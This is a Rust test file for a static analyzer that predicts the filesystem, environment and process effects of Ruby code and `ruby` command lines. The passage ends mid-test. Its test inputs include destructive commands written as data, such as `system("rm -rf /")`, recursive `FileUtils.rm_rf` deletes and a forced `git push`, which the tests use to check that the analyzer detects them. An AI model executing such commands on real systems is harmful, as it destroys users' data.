use std::collections::HashMap;

use effinterp_engine::{
    CallableVisibility, Engine, Lang, ScopeKey, SourceRefusal, SourceRequest, SourceResolver,
    SourceResponse, UnavailableReason, module_summaries,
};
use effinterp_proto::{
    AttrValue, BoundaryClass, CoverageLevel, Domain, ResourceExpr, ResourceIdentity, Subject,
    validate_plan,
};

fn ruby(source: &str) -> effinterp_proto::Plan {
    let plan = Engine::new()
        .analyze(&Subject::Source {
            dialect: None,
            language: "ruby".to_string(),
            source: source.to_string(),
            cwd: Some("/w".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn ops(plan: &effinterp_proto::Plan) -> Vec<&str> {
    plan.effects
        .iter()
        .map(|e| e.operation.0.as_str())
        .collect()
}

fn code_source(plan: &effinterp_proto::Plan) -> Option<&str> {
    plan.effects
        .iter()
        .find(|effect| effect.operation.0 == "process.code_execution")
        .and_then(|effect| effect.attributes.get("source"))
        .and_then(|value| match value {
            effinterp_proto::AttrValue::String(value) => Some(value.as_str()),
            _ => None,
        })
}

fn fs_path(e: &effinterp_proto::Effect) -> Option<&str> {
    match &e.resource {
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path },
        } => Some(path),
        _ => None,
    }
}

fn code_cwd(plan: &effinterp_proto::Plan) -> Option<&ResourceExpr> {
    plan.effects
        .iter()
        .find_map(|effect| match &effect.resource {
            ResourceExpr::Concrete {
                identity:
                    ResourceIdentity::Process {
                        executable, cwd, ..
                    },
            } if effect.operation.0 == "process.code_execution" && executable == "ruby" => {
                cwd.as_deref()
            }
            _ => None,
        })
}

struct RubySources(HashMap<String, String>);

impl SourceResolver for RubySources {
    fn source_mutation_disjoint(
        &self,
        _: &effinterp_proto::ResourceExpr,
        _: effinterp_engine::SourceRequest<'_>,
    ) -> bool {
        true
    }

    fn resolve(&self, request: SourceRequest<'_>) -> SourceResponse {
        self.0
            .get(request.path.trim_start_matches('/'))
            .map_or_else(
                || SourceResponse::Refused(SourceRefusal::Unavailable(UnavailableReason::Missing)),
                |source| SourceResponse::Source(source.as_bytes().to_vec()),
            )
    }

    fn siblings(&self, _path: &str) -> Option<Vec<String>> {
        Some(Vec::new())
    }
}

#[test]
fn no_entry_point_distinguishes_unreached_ruby_callables() {
    let declarations = "class Storage\n  def purge\n    File.delete('/tmp/storage')\n  end\nend\n";
    let plan = ruby(declarations);
    let boundary = plan
        .boundaries
        .iter()
        .find(|boundary| boundary.reason.as_str() == "no_entry_point")
        .expect("declaration-only Ruby has no execution root");
    assert_eq!(boundary.class, BoundaryClass::Unresolved);
    assert_eq!(
        boundary.detail.as_deref(),
        Some("no execution root reached; declared callables not executed: Storage.purge")
    );
    for domain in ["environment", "filesystem", "network", "process"] {
        assert_eq!(
            plan.coverage.0[&Domain::new(domain)].level,
            CoverageLevel::Partial
        );
    }

    let reached = ruby(
        "class Storage\n  def purge\n    File.delete('/tmp/reached')\n  end\nend\nStorage.new.purge\n",
    );
    assert!(reached.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/tmp/reached")
    }));
    assert!(
        reached
            .boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "no_entry_point")
    );

    let top_level = ruby("def stale; File.delete('/stale'); end\nFile.delete('/top')\n");
    assert!(top_level.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/top")
    }));
    assert!(
        top_level
            .boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "no_entry_point")
    );
    assert!(
        ruby("")
            .boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "no_entry_point")
    );
}

#[test]
fn system_nests_shell() {
    let plan = ruby(r#"system("rm -rf /tmp/x")"#);
    // ruby -> nested shell -> rm -> filesystem.delete
    assert!(ops(&plan).contains(&"filesystem.delete"));
    assert!(
        plan.effects
            .iter()
            .any(|e| e.operation.0 == "filesystem.delete" && fs_path(e) == Some("/tmp/x"))
    );
}

// Regression: Thor methods and Rake task helpers execute through framework
// dispatch even though the file contains no ordinary call to their bodies.
#[test]
fn thor_roots_and_rake_helpers_are_entered() {
    let thor = ruby(
        r#"require "thor"
require "fileutils"
class Deploy < Thor
  desc "publish", "publish"
  def publish(path)
    FileUtils.mkdir_p(path)
    system("rm", "-rf", "/srv/app/tmp/cache")
    system("git", "push", "--force", "origin", "release")
    system("cap", "production", "deploy:restart")
  end
  no_commands do
    def hidden
      system("rm", "-rf", "/tmp/never-a-command")
    end
  end
  private
  def helper
    FileUtils.rm_rf("/private")
  end
end
Deploy.start(ARGV)"#,
    );
    assert!(thor.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.create"
            && matches!(&effect.resource, ResourceExpr::Parameter { name } if name == "path")
    }));
    assert!(
        !thor
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/private"))
    );
    assert!(
        thor.boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "no_entry_point")
    );

    for executable in ["rm", "git", "cap"] {
        assert!(thor.effects.iter().any(|effect| effect.operation.0 == "process.exec"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::Process { executable: name, .. } } if name == executable)));
    }
    assert!(
        thor.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete"
                && fs_path(effect) == Some("/srv/app/tmp/cache"))
    );
    assert!(
        thor.effects
            .iter()
            .any(|effect| effect.operation.0 == "git.remote_sync"
                && effect.attributes.get("force") == Some(&effinterp_proto::AttrValue::Bool(true)))
    );
    assert!(
        !thor
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/tmp/never-a-command"))
    );

    let rake = ruby(
        r#"require "rake"
task :clean do
  mkdir_p "/rake-dir"
  sh "rm -rf /rake-shell"
end"#,
    );
    assert!(rake.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.create" && fs_path(effect) == Some("/rake-dir")
    }));
    assert!(rake.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/rake-shell")
    }));

    let shadowed = ruby(
        "class Thor; end\nclass Deploy < Thor\n  def publish\n    FileUtils.rm_rf('/dormant')\n  end\nend",
    );
    assert!(
        !shadowed
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/dormant"))
    );
    assert!(
        shadowed
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "no_entry_point")
    );
}

#[test]
fn fileutils_rm_rf_is_recursive_delete() {
    let plan = ruby(
        r#"require "fileutils"
FileUtils.rm_rf("/data")"#,
    );
    let del = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.delete")
        .expect("delete");
    assert_eq!(fs_path(del), Some("/data"));
    assert_eq!(
        del.attributes["recursive"],
        effinterp_proto::AttrValue::Bool(true)
    );
}

#[test]
fn uncalled_method_is_not_executed() {
    let plan = ruby(
        r#"require "fileutils"
def danger
  FileUtils.rm_rf("/important")
end
puts "hi""#,
    );
    assert!(!ops(&plan).contains(&"filesystem.delete"));
}

#[test]
fn called_method_substitutes_arguments() {
    let plan = ruby(
        r#"require "fileutils"
def wipe(p)
  FileUtils.rm_rf(p)
end
wipe("/var/cache")"#,
    );
    let del = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.delete")
        .expect("delete from called method");
    assert_eq!(fs_path(del), Some("/var/cache"));
}

#[test]
fn interpolated_locals_constants_and_path_producers_flow_to_sinks() {
    let plan = ruby(
        r##"root = "/var/app"
FileUtils.rm_rf("#{root}/cache")
def globbed(d)
  File.read("#{d}/*")
end
globbed("/x")
LOG_DIR = "/var/log/app"
File.delete(File.join(LOG_DIR, "old.log"))
expanded = File.expand_path("../cache", __dir__)
File.delete(expanded)
home = Dir.home
File.delete("#{home}/.cache/tool")
(Pathname.new("/srv/app") + "tmp").delete
(Pathname("/srv") / "x").rmtree
FileUtils.rm_r(File.expand_path("~/", "/base"))
File.delete(File.expand_path("~other/x"))"##,
    );
    for path in [
        "/var/app/cache",
        "/x/*",
        "/var/log/app/old.log",
        "/cache",
        "/srv/app/tmp",
        "/srv/x",
    ] {
        assert!(
            plan.effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "missing {path}: {:?}",
            plan.effects
        );
    }
    assert!(plan.effects.iter().any(|effect| {
        matches!(
            &effect.resource,
            ResourceExpr::Join { parts }
                if matches!(parts.as_slice(), [ResourceExpr::Literal { value }, ResourceExpr::Environment { name }, ..] if value.is_empty() && name == "HOME")
        )
    }));

    // `~` expands to the home directory and `~user` to a home it cannot name,
    // never to a directory named `~`.
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(&effect.resource, ResourceExpr::Environment { name } if name == "HOME")
    }));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| fs_path(effect).is_some_and(|path| path.contains('~'))),
        "{:?}",
        plan.effects
    );

    let poisoned = ruby("path = '/first'\npath = '/second' if ARGV[0]\nFile.delete(path)\n");
    assert!(matches!(
        poisoned
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .map(|effect| &effect.resource),
        Some(ResourceExpr::Unresolved { family }) if family.0 == "filesystem"
    ));
    assert_eq!(
        poisoned
            .boundaries
            .iter()
            .filter(|boundary| boundary.reason.as_str() == "unmodeled_dynamic")
            .count(),
        1
    );
}

#[test]
fn textual_concatenation_does_not_insert_path_separators() {
    let plan = ruby(
        r##"id = "42"
File.delete("/tmp/job-#{id}.log")
name = "abc"
File.delete("/tmp/pre#{name}post.txt")
app = "app"
File.delete("/var/log/" + app + ".log")"##,
    );
    let paths: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .map(|effect| fs_path(effect).expect("concrete filesystem path"))
        .collect();
    assert_eq!(
        paths,
        ["/tmp/job-42.log", "/tmp/preabcpost.txt", "/var/log/app.log"]
    );
}

#[test]
fn textual_concatenation_refolds_after_call_binding() {
    let plan = ruby(
        r##"def positional(id)
  File.delete("/tmp/job-#{id}.log")
end
def plus(id)
  File.delete("/var/log/app-" + id + ".log")
end
def keyword(id:)
  File.delete("/tmp/job-#{id}.log")
end
def default(id = "9")
  File.delete("/tmp/job-#{id}.log")
end
def interpolated_parts(prefix, suffix)
  File.delete("#{prefix}#{suffix}")
end
def plus_parts(prefix, suffix)
  File.delete(prefix + suffix)
end
class Job
  def initialize(id:)
    @id = id
  end
  def delete
    File.delete("/tmp/job-#{@id}.log")
  end
end
positional("42")
plus("x")
keyword(id: "5")
default
interpolated_parts("/tmp/interpolated-", "6.log")
plus_parts("/tmp/plus-", "8.log")
Job.new(id: "7").delete"##,
    );
    let paths: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .map(|effect| fs_path(effect).expect("concrete filesystem path"))
        .collect();
    assert_eq!(
        paths,
        [
            "/tmp/job-42.log",
            "/var/log/app-x.log",
            "/tmp/job-5.log",
            "/tmp/job-9.log",
            "/tmp/interpolated-6.log",
            "/tmp/plus-8.log",
            "/tmp/job-7.log"
        ]
    );
}

#[test]
fn symbolic_textual_fragments_do_not_insert_cwd() {
    let plan = ruby(
        r##"def wipe(prefix, suffix)
  File.delete("#{prefix}#{suffix}")
end
def db(env = ENV.fetch("RAILS_ENV"))
  File.read("/etc/#{env}.yml")
end
wipe(ENV["HOME"], "/x")
db"##,
    );
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .expect("delete");
    assert_eq!(
        delete.resource,
        ResourceExpr::Join {
            parts: vec![
                ResourceExpr::Literal {
                    value: String::new()
                },
                ResourceExpr::Environment {
                    name: "HOME".into()
                },
                ResourceExpr::Literal { value: "/x".into() },
            ]
        }
    );
    let read = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.read")
        .expect("read");
    assert_eq!(
        read.resource,
        ResourceExpr::Join {
            parts: vec![
                ResourceExpr::Literal {
                    value: String::new()
                },
                ResourceExpr::Literal {
                    value: "/etc/".into()
                },
                ResourceExpr::Environment {
                    name: "RAILS_ENV".into()
                },
                ResourceExpr::Literal {
                    value: ".yml".into()
                },
            ]
        }
    );
}

#[test]
fn pathname_receiver_effects_require_pathname_values() {
    let plan = ruby(
        r#"path = Pathname.new("/srv/path")
path.read
name = "/etc/passwd"
name.read
name.delete("etc")
home = ENV["HOME"]
home.delete("\n")"#,
    );
    let filesystem_effects: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.domain() == "filesystem")
        .collect();
    assert_eq!(filesystem_effects.len(), 1, "{:?}", plan.effects);
    assert_eq!(fs_path(filesystem_effects[0]), Some("/srv/path"));
}

#[test]
fn unqualified_class_constants_resolve_in_their_defining_class() {
    let plan = ruby(
        r#"class A
  ROOT = "/a"
  def delete
    File.delete(ROOT)
  end
end
class B
  ROOT = "/b"
  def delete
    File.delete(ROOT)
  end
end
A.new.delete
B.new.delete
File.delete(ROOT)"#,
    );
    let deletes: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect();
    assert_eq!(deletes.len(), 3);
    assert_eq!(fs_path(deletes[0]), Some("/a"));
    assert_eq!(fs_path(deletes[1]), Some("/b"));
    assert!(matches!(
        deletes[2].resource,
        ResourceExpr::Unresolved { .. }
    ));
}

#[test]
fn keyword_defaults_and_constructor_ivars_flow_to_sinks() {
    let plan = ruby(
        r#"class Workspace
  def initialize(root:)
    @root = root
  end
  def reset
    FileUtils.rm_rf(@root)
  end
end
class PositionalWorkspace
  def initialize(root)
    @root = root
  end
  def reset
    FileUtils.rm_rf(@root)
  end
end
def wipe(path = "/var/log/x")
  File.delete(path)
end
def db(env = ENV.fetch("RAILS_ENV"))
  File.read(File.join("/etc", env, ".yml"))
end
Workspace.new(root: "/srv/build").reset
PositionalWorkspace.new("/srv/positional").reset
wipe
db"#,
    );
    for path in ["/srv/build", "/srv/positional", "/var/log/x"] {
        assert!(
            plan.effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "missing {path}: {:?}",
            plan.effects
        );
    }
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "environment.read"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::EnvironmentVariable { name }
                } if name == "RAILS_ENV"
            )
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(
                &effect.resource,
                ResourceExpr::Join { parts }
                    if parts.iter().any(|part| matches!(part, ResourceExpr::Environment { name } if name == "RAILS_ENV"))
            )
    }));
}

#[test]
fn recursive_defaults_are_bounded_and_duplicate_applications_are_free() {
    let plan = ruby(
        r#"def direct(value = direct)
  File.delete(value)
end
def outer
  nested
end
def nested(value = nested)
  File.delete(value)
end
def config(env = ENV.fetch("RAILS_ENV"))
  File.read(env)
end
direct
outer
config
config"#,
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .count(),
        2
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "environment.read")
            .count(),
        1
    );
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.read")
            .count(),
        1
    );
}

#[test]
fn distinct_method_applications_are_bounded_per_call_site() {
    let calls: String = (0..65)
        .map(|index| format!("wipe('/tmp/{index}')\n"))
        .collect();
    let plan = ruby(&format!(
        "def wipe(path)\n  File.delete(path)\nend\n{calls}"
    ));
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .count(),
        64
    );
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "partial_analysis"
            && boundary.limit.as_deref() == Some("max_ruby_call_sites")
            && boundary.class == BoundaryClass::Limit
    }));
}

#[test]
fn recursive_procs_terminate_in_live_and_summary_analysis() {
    let source = "f = nil\nf = proc { File.delete('/recursive'); f.call }\nf.call\n";
    let plan = ruby(source);
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/recursive")
    }));
    let _ = module_summaries(
        source,
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
}

#[test]
fn rebinding_a_proc_local_clears_the_callable() {
    let source = "cb = proc { File.delete('/stale') }\ncb = nil\ncb.call\n";
    let plan = ruby(source);
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/stale"))
    );

    let summary = module_summaries(
        "def run\n  cb = proc { File.delete('/stale') }\n  cb = nil\n  cb.call\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    assert!(
        !run.summary
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/stale"))
    );
}

#[test]
fn guarded_proc_rebindings_preserve_every_reachable_body() {
    let source = "cb = proc { File.delete('/first') }\nif ARGV[0]\n  cb = proc { File.delete('/second') }\nelse\n  cb = proc { File.delete('/third') }\nend\ncb.call\nlooped = proc { File.delete('/loop-first') }\n[1].each { looped = proc { File.delete('/loop-second') } }\nlooped.call\n";
    let plan = ruby(source);
    for path in ["/first", "/second", "/third", "/loop-first", "/loop-second"] {
        assert!(
            plan.effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "missing {path}: {:?}",
            plan.effects
        );
    }

    let summary = module_summaries(
        &format!("def run\n{}end\n", source.replace('\n', "\n  ")),
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    for path in ["/first", "/second", "/third", "/loop-first", "/loop-second"] {
        assert!(
            run.summary
                .effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "missing summary effect {path}: {:?}",
            run.summary.effects
        );
    }
}

#[test]
fn guarded_receiver_rebindings_preserve_locals_and_instance_variables() {
    let source = "class LocalFirst\n  def act; File.delete('/local-first'); end\nend\nclass LocalSecond\n  def act; File.delete('/local-second'); end\nend\nclass IvarFirst\n  def act; File.delete('/ivar-first'); end\nend\nclass IvarSecond\n  def act; File.delete('/ivar-second'); end\nend\nclass Stale\n  def act; File.delete('/stale'); end\nend\nclass Active\n  def act; File.delete('/active'); end\nend\nreceiver = LocalFirst.new\nreceiver = LocalSecond.new if ARGV[0]\nreceiver.act\nstraight = Stale.new\nstraight = Active.new\nstraight.act\nclass Runner\n  def run\n    @receiver = IvarFirst.new\n    @receiver = IvarSecond.new if ARGV[0]\n    @receiver.act\n  end\nend\nRunner.new.run\n";
    let plan = ruby(source);
    for path in [
        "/local-first",
        "/local-second",
        "/ivar-first",
        "/ivar-second",
        "/active",
    ] {
        assert!(
            plan.effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "missing {path}: {:?}",
            plan.effects
        );
    }
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/stale"))
    );

    let summary = module_summaries(
        source,
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "Runner.run")
        .unwrap();
    for path in ["/ivar-first", "/ivar-second"] {
        assert!(
            run.summary
                .effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "missing summary effect {path}: {:?}",
            run.summary.effects
        );
    }
}

#[test]
fn proc_and_receiver_candidate_caps_emit_dynamic_dispatch_boundaries() {
    let proc_rebindings: String = (0..17)
        .map(|i| {
            format!("if ARGV[0]\n  callback = proc {{ File.delete('/candidate-{i}') }}\nend\n")
        })
        .collect();
    let proc_source =
        format!("callback = proc {{ File.delete('/initial') }}\n{proc_rebindings}callback.call\n");
    let plan = ruby(&proc_source);
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "dynamic_dispatch"
            && boundary.limit.as_deref() == Some("max_callback_values")
    }));

    let summary = module_summaries(
        &format!("def run\n{}end\n", proc_source.replace('\n', "\n  ")),
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    assert!(run.summary.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "dynamic_dispatch"
            && boundary.limit.as_deref() == Some("max_callback_values")
    }));

    let classes: String = (0..17)
        .map(|i| format!("class Candidate{i}\n  def act; end\nend\n"))
        .collect();
    let receiver_rebindings: String = (1..17)
        .map(|i| format!("receiver = Candidate{i}.new if ARGV[0]\n"))
        .collect();
    let receiver_plan = ruby(&format!(
        "{classes}receiver = Candidate0.new\n{receiver_rebindings}receiver.act\n"
    ));
    assert!(receiver_plan.boundaries.iter().any(|boundary| {
        boundary.reason.as_str() == "dynamic_dispatch"
            && boundary.limit.as_deref() == Some("max_callback_values")
    }));
}

/// Every part of a `case ... in` runs code, as do `BEGIN` and `END` blocks;
/// a part the walker skips is dropped at full coverage.
#[test]
fn pattern_match_and_program_blocks_are_walked() {
    let plan = ruby(
        r#"BEGIN { File.delete("/begin") }
END { File.delete("/end") }
case File.read("/subject")
in String if File.delete("/guard")
  File.delete("/arm")
in ^(File.read("/pinned"))
  1
else
  File.delete("/else")
end"#,
    );
    let paths: Vec<_> = plan.effects.iter().filter_map(fs_path).collect();
    for path in [
        "/begin", "/end", "/subject", "/guard", "/arm", "/pinned", "/else",
    ] {
        assert!(paths.contains(&path), "{path}: {paths:?}");
    }
}

#[test]
fn file_delete_and_write() {
    let plan = ruby(
        r#"File.delete("/a")
File.write("/b", "x")"#,
    );
    assert!(ops(&plan).contains(&"filesystem.delete"));
    assert!(ops(&plan).contains(&"filesystem.write"));
}

#[test]
fn fileutils_copy_file_models_both_operands_only_for_the_exact_api() {
    let plan = ruby(
        r#"FileUtils.copy_file("/source", "/target")
OtherUtils.copy_file("/wrong-source", "/wrong-target")"#,
    );
    assert!(plan.effects.iter().any(
        |effect| effect.operation.0 == "filesystem.read" && fs_path(effect) == Some("/source")
    ));
    assert!(plan.effects.iter().any(
        |effect| effect.operation.0 == "filesystem.write" && fs_path(effect) == Some("/target")
    ));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| { matches!(fs_path(effect), Some("/wrong-source" | "/wrong-target")) })
    );
}

#[test]
fn malformed_source_is_a_boundary_not_a_panic() {
    let plan = ruby("def broken(");
    validate_plan(&plan).unwrap();
    // Either a parse-error boundary or simply no effects; never a panic.
    assert!(plan.effects.is_empty() || !plan.boundaries.is_empty());
}

#[test]
fn deterministic() {
    let src = r#"system("rm /x"); FileUtils.rm_rf("/y")"#;
    let a = effinterp_proto::canonical_json(&ruby(src));
    let b = effinterp_proto::canonical_json(&ruby(src));
    assert_eq!(a, b);
}

#[test]
fn ruby_dash_e_command_model_composes() {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: vec!["ruby".into(), "-e".into(), "system(\"rm -rf /\")".into()],
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert_eq!(code_source(&plan), Some("argument"));
    // ruby -e -> Source(ruby) -> system -> shell -> rm -> filesystem.delete
    assert!(ops(&plan).contains(&"filesystem.delete"));
}

#[test]
fn ruby_stdin_program_is_unavailable() {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: vec!["ruby".into(), "-".into(), "data.rb".into()],
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap();
    assert_eq!(code_source(&plan), Some("stdin"));
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "unrecoverable_source")
    );
    assert!(
        plan.effects
            .iter()
            .all(|effect| effect.operation.0 != "filesystem.read")
    );
}

#[test]
fn ruby_directory_option_preserves_the_script_operand() {
    for argv in [
        vec!["ruby", "-C", "/tmp", "script.rb"],
        vec!["ruby", "-C/tmp", "script.rb"],
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Exec {
                argv: argv.iter().map(|value| value.to_string()).collect(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert_eq!(code_source(&plan), Some("file"), "{argv:?}");
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.read"
                    && fs_path(effect) == Some("/tmp/script.rb")),
            "{argv:?}"
        );
    }

    let plan = Engine::new()
        .with_resolver(Box::new(RubySources(HashMap::from([
            (
                "task.rb".to_string(),
                "File.delete('/ruby-root')".to_string(),
            ),
            (
                "sub/task.rb".to_string(),
                "File.delete('/ruby-sub')".to_string(),
            ),
        ]))))
        .analyze(&Subject::Exec {
            argv: vec!["ruby".into(), "-C".into(), "sub".into(), "task.rb".into()],
            cwd: Some(".".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(
        plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/ruby-sub")
        }),
        "{:?}",
        plan.effects
    );
    assert!(plan.effects.iter().all(|effect| {
        effect.operation.0 != "filesystem.delete" || fs_path(effect) != Some("/ruby-root")
    }));
}

#[test]
fn ruby_directory_option_updates_inline_and_stdin_execution() {
    for argv in [
        vec!["ruby", "-C", "sub", "-e", "File.delete('victim')"],
        vec!["ruby", "-C", "sub", "-eFile.delete('victim')"],
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Exec {
                argv: argv.iter().map(|value| value.to_string()).collect(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(matches!(
            code_cwd(&plan),
            Some(ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }) if path == "/w/sub"
        ));
        assert!(plan.execution_graph.nodes.iter().any(|node| matches!(
            &node.subject,
            Subject::Source { language, cwd, .. }
                if language == "ruby" && cwd.as_deref() == Some("/w/sub")
        )));
    }

    for argv in [vec!["ruby", "-C", "sub"], vec!["ruby", "-C", "sub", "-"]] {
        let plan = Engine::new()
            .analyze(&Subject::Exec {
                argv: argv.iter().map(|value| value.to_string()).collect(),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(matches!(
            code_cwd(&plan),
            Some(ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            }) if path == "/w/sub"
        ));
    }
}

#[test]
fn env_subscript_reads_and_writes() {
    let plan = ruby(
        r#"home = ENV["HOME"]
shell = ENV.fetch("SHELL", "/bin/sh")
ENV["APP_MODE"] = "test"
empty = ENV[""]"#,
    );
    let envs: Vec<(&str, &effinterp_proto::ResourceExpr)> = plan
        .effects
        .iter()
        .map(|e| (e.operation.0.as_str(), &e.resource))
        .collect();
    let name = |e: &effinterp_proto::ResourceExpr| match e {
        ResourceExpr::Concrete {
            identity: ResourceIdentity::EnvironmentVariable { name },
        } => Some(name.clone()),
        _ => None,
    };
    assert!(
        envs.iter()
            .any(|(op, r)| *op == "environment.read" && name(r).as_deref() == Some("HOME"))
    );
    assert!(
        envs.iter()
            .any(|(op, r)| *op == "environment.read" && name(r).as_deref() == Some("SHELL"))
    );
    assert!(
        envs.iter()
            .any(|(op, r)| *op == "environment.write" && name(r).as_deref() == Some("APP_MODE"))
    );
    assert!(envs.iter().any(|(op, resource)| {
        *op == "environment.read"
            && matches!(resource, ResourceExpr::Unresolved { family }
                if family.0 == "environment")
    }));
}

#[test]
fn env_method_mutations_are_writes_and_removals_are_marked() {
    let body = r#"ENV.delete("DEBUG")
ENV.update("A" => "1", key => "dynamic")
ENV.merge!("B" => "2")
ENV.replace("C" => "3")
ENV.clear
"#;
    let plan = ruby(body);
    let is_env_name = |effect: &effinterp_proto::Effect, expected: &str| {
        matches!(&effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name },
            } | ResourceExpr::Environment { name } if name == expected)
    };
    for name in ["DEBUG", "A", "B", "C"] {
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "environment.write" && is_env_name(effect, name)
        }));
    }
    let deleted = plan
        .effects
        .iter()
        .find(|effect| is_env_name(effect, "DEBUG"))
        .unwrap();
    assert_eq!(
        deleted.attributes.get("unset"),
        Some(&effinterp_proto::AttrValue::Bool(true))
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "environment.write"
            && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                if family.0 == "environment")
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "environment.write"
            && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                if family.0 == "environment")
            && effect.attributes.get("unset") == Some(&effinterp_proto::AttrValue::Bool(true))
    }));

    let summary = module_summaries(
        &format!("def configure\n{}end\n", body.replace('\n', "\n  ")),
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let configure = summary
        .functions
        .iter()
        .find(|function| function.name == "configure")
        .unwrap();
